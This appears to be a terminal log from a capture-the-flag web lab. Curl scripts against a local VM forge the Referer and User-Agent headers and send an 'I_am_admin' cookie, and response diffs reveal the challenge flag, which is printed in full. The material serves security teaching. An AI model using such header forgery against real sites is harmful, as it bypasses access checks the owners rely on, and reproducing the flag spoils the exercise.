```
e1z2r10p4% cat headers.step_0.sh 
#!/bin/bash
curl 'http://192.168.99.100/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' \
	-H 'Connection: keep-alive' \
	-H 'Pragma: no-cache' \
	-H 'Cache-Control: no-cache' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' \
	-H 'Referer: http://192.168.99.100/' \
	-H 'Accept-Encoding: gzip, deflate' \
	-H 'Accept-Language: en-US,en;q=0.9' \
	-H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' --compressed \
    -o step_0.html
e1z2r10p4% 
e1z2r10p4% 
e1z2r10p4% ./headers.step_0.sh 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11395    0 11395    0     0  2690k      0 --:--:-- --:--:-- --:--:-- 2781k
e1z2r10p4%                     
e1z2r10p4% diff headers.step_0.sh headers.step_1.sh 
9c9
< 	-H 'Referer: http://192.168.99.100/' \
---
> 	-H 'Referer: https://www.nsa.gov/' \
13c13,14
<     -o step_0.html
---
>     -o step_1.html
> 
e1z2r10p4% 
e1z2r10p4% 
e1z2r10p4% ./headers.step_1.sh 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11410    0 11410    0     0  2501k      0 --:--:-- --:--:-- --:--:-- 2785k
e1z2r10p4% 
e1z2r10p4% diff step_0.html step_1.html 
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> FIRST STEP DONE<audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
e1z2r10p4% 
e1z2r10p4% 
e1z2r10p4% 
e1z2r10p4% diff headers.step_0.sh headers.step_2.sh 
7c7
< 	-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' \
---
> 	-H 'User-Agent: ft_bornToSec' \
9c9
< 	-H 'Referer: http://192.168.99.100/' \
---
> 	-H 'Referer: https://www.nsa.gov/' \
13c13,14
<     -o step_0.html
---
>     -o step_2.html
> 
e1z2r10p4% 
e1z2r10p4% 
e1z2r10p4% ./headers.step_2.sh 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11518    0 11518    0     0  2387k      0 --:--:-- --:--:-- --:--:-- 2812k
e1z2r10p4% 
e1z2r10p4% diff step_0.html step_2.html 
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
e1z2r10p4% 
e1z2r10p4% 
```
